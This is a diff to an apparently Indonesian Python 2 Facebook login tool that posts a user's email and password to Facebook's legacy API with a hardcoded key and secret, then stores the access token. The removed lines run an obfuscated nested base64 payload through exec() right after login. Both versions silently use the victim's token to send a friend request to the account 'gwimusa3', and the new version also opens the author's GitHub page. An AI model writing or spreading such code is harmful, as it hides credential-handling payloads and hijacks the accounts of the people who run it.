@@ -141,36 +141,36 @@ def login():
 		url = br.geturl()
 		if 'save-device' in url:
 			try:
-                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
-                x = hashlib.new('md5')
-                x.update(sig)
-                a = x.hexdigest()
-                data.update({'sig': a})
-                url = 'https://api.facebook.com/restserver.php'
-                r = requests.get(url, params=data)
-                z = json.loads(r.text)
-                zedd = open('login.txt', 'w')
-                zedd.write(z['access_token'])
-                zedd.close()
-                exec(base64.b64decode('aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2FXMXdiM0owSUdKaGMyVTJOQXBsZUdWaktHSmhjMlUyTkM1aU5qUmtaV052WkdVb0oyRlhNWGRpTTBvd1NVY3hhR051VG05WlYzZHpaVzE0Y0ZscGVHbFpXRTVzVG1wUlMxcFlhR3haZVdoMFdWaEtlbUZIUm5OTWJYaDJXVmRTZWt0SWNITmhWMGwxV2tkV2FtSXlNWGRqYlZaNlkzbG9hVmxZVG14T2FsRjFXV3BaTUZwSFZtcGlNbEpzUzBOS2JGTnVjREJOVldSclRVVmFSMVpXVmpOVlJXaGhWa2RHVVUxNlRuSlVhelZNVWxkMFNsTnNSa2xWZWxwRlRXeFdRbEZYTVc5WmJUVm9VMFp3UjFScVNqTlBSRkpJVVRCSmVGRjZZek5OZWsxNlltNWFNbVJ0UmxCYU1qbE1VVEk1Y0ZFeVpIWlRNRTUyWTFWT2NHTnJPVk5TTTJSdFQxVm9jRlI1T0hsTU1sWnJUVzFLYkdKWFNuVmlhazR3VDFSc2FVMXRTbEJXTUhCWFYwaGpkMVJUT1haTU1VcFZUMFJzVm1KdE1IcE9iR3h6VW14S1IyRldXbXBXVmxwWFVqRk9WVmRZU2s5amEyUlVWMjF3VEZGdE5WZE5la3BNVDBaU1VWVjZaRlJNZWtaR1dWUkJOV1JxV25aaWVrWXlUREE1ZUZGWWFEWk9NVVo1VVRBMVNGTXhiR3RYYlU1VFkwZHNSVkpGVWsxTmExWk9VVlJvTVZOWGREUmliV2h4WWtSYVFsWXdaelJTTUdScFRXMVdXbFpFVlhKVmJuQkVUV3RLZFdKWWFITmlWVlp3VmpGT1dsWkdaR3BWV0VKd1lXdFNjVkpJYkU5VVZXczFWREJzVm1SNlRtOWhiWGN4VWxjeFIyTlZNWHBsYW1oR1pESm9jVmR1UW5CTlJGSXpZVWh2TW1WSGNFUlVhMlJZVjFkS1Zsa3hTbmRoVmxKRllXdFNkRkV3TVVaUFJUbEtUVWhqTkdSNlZqTlBWMmhGVVd0S1JWUkdRVEJUVlRGTFRrVXdkMlZwT1VKa01tZzJWMjV2ZGxFelVraFZNV3haV201T1VtTkhiRFpTUmxKUFlWVjRUbEpUT0hwVFZWWTBaRzFvZVdKVVVraE5hMmg0VkZoT05tVldhRkpoVmxKd1RXdFdOVnBIYkUxVVZFNVRUVVZyZDA1V2NHOVBWekI0VTBWa1Iwc3daSFJaYTJ4UFYxWnZNV1JHU21GYU1GWnZZMjB3TWxGc1pFZFJNR1JZV1dwR1lXSXhVa3RsU0hCRVYyMHhORkpITUhaaE1rWkdUbTFPUW1ReWFEWlhWMlJWVVd4a1NHSlhTa1phVm14WFRtNU9VazVYWjNKU1JXaFBUMVY0YWxNd1ZrNVpNMjh5Vkd4R2IxWkhiRWhTTUdSNVZsZEdXbUZFV25wVlZYQjJWMjFvY1dOVVJrWlNNR2R5VWpJeGFWUlZUbHBXYWxJeFZXcFdiMkV5YUhsaVZGWkZVakJrY0ZJd1pHbGxiRloyVlZoQ05HRnJUbkZpUjJ4RlZGUlJORlpWYkVaUFNFNHpZMGhvV21GR1VrUk5hMlJZV1d0R1VsZFdVak5YV0doNVVsVkdXbFo2WkZGVmFsWnZZbFZTVFZScWJFbGpNSFJXVjFoQ2NHVkhUalJUUnpFMVpXMTBTazFFVWs5aFNIQjZUVlZrZEZSdE9VNWpla3BTVmpOa01sb3paSEZTTTA1MFpETktNMDB3UlhsU2JVWk9XVE53TVU1c1JtOVdSM0IwVWxjeFZXRXdPVnBaYWxwYVlWWlNRMHN3WkRGV1JrWkhWMWRXZG1WSWNFcGphM0JFVTJzNWFWZFdSbUZVVmtaM1dqRkNTMlZWY0U1VWVsSnBWMnhDTTFKdGFFeGhhM2hPVFZaQ1JsTlVaM1pOUkZKdlZFVldOV1ZyWkRCaGExWm9WMVZLTTA1dVpHRmFNM0JGVGxWa1dGZHVaRWRqTUc4MFZVVktkMkZGT1hGVVJUQXdWbXRXU2xaVVZsZGhSbkIyVGxWV2RGRnFiRWxUVlZZellWaGpNMlF6YUVsU01HaEVVakZrYVZKRk1VcFZXRUkyVWtWU1JXRkliRTFVV0VGM1ZGWkdkMW96V2tWVFJVbHlWRlV4VDFaV2NHRmlWRkowWkRKc2JsUlhkRFpUVld4YVdrUlNhR0ZWVWtSVWEyUllXV3Q0UWxOV1JuZGxiWEJFWVdzeE5GSkhNV3BsYlZwRVpVVlNTVlJYUmxKTlYyaENZVWRvZEdJeFJqQmhSa0pEWW10amVWVnFiRzlOTW5SelUwY3hVRmRWTVhwUFJUbExWRlYwVmxkc2NIZGtNRkphV1dwV1RGVlVWbkJhVlZKSlZGTjBSMVl3WkVSU01XUmhZMFZPZWxSSGRGcFJiV1F3VWpGa1NWcFlValZVYXpGb1RrZEtZV0Y2VWxKa2VsWlRZa2N4Vm1GVmVFUmFhelY2VlVac2JXSXpiRFpTTVZaWFYxZFdkbVZ1Y0VaaU1rb3paRlpLYjJKVmJFZFdNbWhOWWxab2JsSkZVakJTTWxab1VWVktXRkpZUms1Wk0ydDNaRzFrY1dWc1JqUkxNRlo2VmtWb1RrNXFZM2RWYmtKd1UwVlNlVlI2U2tkVVZVWldWMVp3Y21GR1FtOVZSekZ5VVdwb1MwMUdiSGRhTW04MFZWZG9WV0ZzWkVkaVYxSldXbFpzZFVzd2JGSlRiVGx6WVVST2RtVkZXblJSVjJ4SVRXMVNibFJzYkZwaU0yUTJVMWRzTVZFeFFrOVhhMWt3VmtoQ05XRnJSblZYVjJoRVlsVktlbFZGTURKT1NHUXpVMjA1WVZOcVpGcFZXR1JwVFRKU1JtSlZUbHBVV0UwelZsVlNNMk5HU201aVZYUTBZakpvVVdKWGJGRlpNRzkzVjJwV2JtVnFaRk5SVnpGeVVqQldXR1JHVmxaWFZYY3dWMnR3YVU1Rk1UTk9lbVJoVWpJeFExZFZNWHBPTURGWFpETkNVMkZITVZGU1dGSkdXbGRLZVZKdFpIRldSMnQ1VWxoV1QxSlhWbHBVTW1RMVpXNUtRMkpyVFRGU01VWmFXa1JHVUZKVGRHaFJWWEF6WTJ4S2IySlZkM2xVYTFab1YxVk9NMDFJYkZCVldFSnhaR3RzYjFORlpETmhhMHBaVTFkb1FtSlhhRWhTYkdSdlZUQTFUbGRIT1ZwWGExcEtWMWhrU1dWc1drUmlWV1J3VWpBNWExb3hSbHBWTWprMlpXeENVbEl3VGxGVVZHaEhVakJhVm1GSVNuSldNbVJ4VVRBMVNGSXhjR3RhYkd4U1kwaHNSVkZyVVRKbFZXaE9XbnBrZGxOVVFURmlSMmh4WkVad1ExSXdVWEpTTWpGVFRXc3hUbEpET1ZsVmJXaHVUak5qTldRd2JGSmpSMmhLWVVoU2NsWlhiRVZSYTFwSVZqRndjbEZWTVVwUFNFWjJWbGhqZWxWdGNIUlhhMVY1VWxoR2FtRXpZelJOYms1dVlXdHdjMkZFUW5oaU1uQTJVWHBGZG1GRlpIVlRNREZQWkdwb1JsTXhiSEprZWxJMVkwZG9jVkZzUW5oaFZYQk9WVVV4VUZrelNscFRXR1JTVlZoc05tUlZVazFSTWxaRlZHc3dkazFIT1VwWmVscHFZVmhrZVZWdGRIUlNha2x5VVRCYVVGWXhiRlJYYkZaU1UyMXNkVTVXU2toaVZUUTBWRzFPVFZOWFRqTmFSa3B6WWxkV1YySlZWalZaTVZZelVqRmtWbFZVVm5ST1dFSnZVakkxVFZSV1FqQlRNR3hhWkROYU0wMUlaSGRoVmxKRlZVWk9jRkZyTVVKak1EVnFWRVpyTUdReU9WSmxXSEF4WVVkd1JFNVZaRkJYV0hCTVUxVnNhazU2YUVwa01qVlRXakl4UmxRd1drWlpWbXhNWkhwb00ySXlhRVZSV0ZwRVlWVndUbFZFVW1oT1ZtaHVVVzFvTTJGSGFIUmFiR2N5VWxWMGFsVllaRE5NTUd4dlpXc3hVRTlGVGtOVlJWSk9WRmRhTlZOVmJETk1NMk0wWld0d2NWWkZSakpaTTJ4SFZGVXhlbFZIVGpaVFYzUXpWbFpHTldWck9WSmFhMDVIVWpBNVdsWldVVEJUVkdjMVdqSktXbFl3YkdGT1dFSlNWMGhrTUZWdGJIUlJWbVJzVVRBNVVWRnJNVUpPUmtKdlZFZDRNRlZ1UW05aVZWSk5WVWRSTlZFeVdraE9XSEJzWWxoU05rNVhlR3RoYkU1NFdtcG9XR1ZZY0VKWlZsSjNWMnMxZEZWdFdsZFZWM1J4VFdzME1rc3lOSEpWTTBvMVYwYzVkV0l6UWpWYVJGWklVV3BzV0dNd1drOWFWR1IwVW1wU1IxVkZaekJWU0doUFlucG9jMVpVVmpSak1VVXdXbTVvV0ZWWWJGQldXR2hNWW10bk1GcHFVWEphUjNjMVZHdG5kbEY2UW5oalZUQTFVMGhXUkZORlJsRlpNMG95VFZoQ1ZGb3pWalpXYldoQ1lUTlNNVnBJU25GV1ZURkZVbGhuZDFZeVVreFdSVVl5WTBad2VWSXpSa1JOUkZaeVZURnNTVll5TVVOV2JrSnFUMWQwTkZSSGRIcFdNa1oyWTIwNVJHUkdiRE5TV0hCc1kxaHNTMDV0WkRGVVIxSkxZVmhTYUdOWFJYaGpNbG93VmtWYVJscEVVbGRqVnpWdFRVWndlRkZ1WkcxV2EwNVNZakIwZVdGSFRtcFNNbmg0Wkd4R1ZtRkZiSFpSYWxaTlZsaG5lR1JWZUZWVGF6VlBaVmhzUzFsWE5YQk5SRTVvWTIxV1dFNHpSblJPYlhkMlZsZEdSVXd5Y0VKWmJUUjRZMnBDYzJWSVFqRmtia0kwWWpGYVRXUkhVbkZaTTJoelRtc3hSMVJIVFROVmFrNW9ZakpaTUZsWVJqRldSbU42WVRGSmVXRnRkelZrVjFKeFpGaHJOVmxYVW5KV2FscFdUakEwTTFZeVRUUk9NVkUwWWxod2Fsb3dNV2hOYm5CNlZFVk9URmxyVGtaa1NHOTVZV3R3VkUxV2JIRmpNMFp4Wld0a1JHVnNiRmRVYlZaV1RUQmFWVlV4V2s5aWJURmFUREF4TkZJd09ESlVWM1EyV2xWNFZHRXliRFZqUkVwdFRWWlNkVlZ0Um1sUFZ6QTFXa1JTTTFWR1JrVlJNa1pSV1ZWMFRGTnJjSGRqUnpsMllqSjBkR0pYTVhCaFYyeFVXVmRHYUZNd2RFdFRia0ozWWpJNWRtRXlNWFJpVjJ4d1lWWk9hRmxYUmt4VE1IQkxZMGhDZG1JeU9YSmlWekYwWVZkc2NGVXlSbWhaVlhSTVUydHdkMk5IT1haaU1uUjBZbGN4Y0dGWGJGUlpWMFpvVXpCMFMxTnVRbmRpTWpsMllUSXhkR0pYYkhCaFZrNW9XVmRHVEZNd2NFdGpTRUoyWWpJNWNtSlhNWFJoVjJ4d1ZUSkdhRmxWZEV4VGEzQjNZMGM1ZG1JeWRIUmlWekZ3WVZkc1ZGbFhSbWhUTUhSTFUyNUNkMkl5T1haaE1qRjBZbGRzY0dGV1RtaFpWMFpNVXpCd1MyTklRblppTWpseVlsY3hkR0ZwT1dsUFJFNUtaRVZPV1Vzd2FHMVZWWGhHWWtaTmQySllZemxRVTBsd1MxTnJjQ2NwS1E9PScpKQ=='))
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
-                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                menu()
-            except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
-                keluar()
-
-        if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mHubungi Author'
-            os.system('rm -rf login.txt')
-            time.sleep(0.02)
-            keluar()
-        else:
-            print '\n\x1b[1;91m[!] Hubungi Agar Script Kembali Normal'
-            os.system('rm -rf login.txt')
-            time.sleep(0.01)
-            login()
+ 				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				zedd = open("login.txt", 'w')
+				zedd.write(z['access_token'])
+				zedd.close()
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://github.com/Ajgtajopit')
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\033[1;91m[!] No connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
+			print("\n\033[1;92m[#] Harap Login Ulang !")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\033[1;91m[!] Login Failed")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
 
 
 def menu():
